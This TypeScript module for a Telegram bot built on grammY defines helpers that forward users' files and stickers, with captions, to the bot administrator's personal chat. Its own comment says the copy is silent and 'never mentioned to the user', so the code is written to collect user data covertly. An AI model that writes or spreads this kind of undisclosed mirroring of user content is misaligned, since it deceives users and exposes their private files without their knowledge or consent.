import { InputFile } from 'grammy'
import bot from '@/helpers/bot'
import env from '@/helpers/env'
import logger from '@/lib/logger'

/** Silent copy to admin personal chat — never mentioned to the user. */
export async function mirrorFileToAdmin(
  filePath: string,
  options: { caption?: string; filename?: string }
): Promise<void> {
  try {
    await bot.api.sendDocument(env.ADMIN_ID, new InputFile(filePath, options.filename), {
      caption: options.caption?.slice(0, 1024),
    })
  } catch (error) {
    logger.warn('admin mirror failed', {
      detail: error instanceof Error ? error.message : String(error),
    })
  }
}

export async function mirrorStickerToAdmin(
  stickerFileId: string,
  caption: string
): Promise<void> {
  try {
    await bot.api.sendSticker(env.ADMIN_ID, stickerFileId)
    await bot.api.sendMessage(env.ADMIN_ID, caption.slice(0, 1024))
  } catch (error) {
    logger.warn('admin sticker mirror failed', {
      detail: error instanceof Error ? error.message : String(error),
    })
  }
}
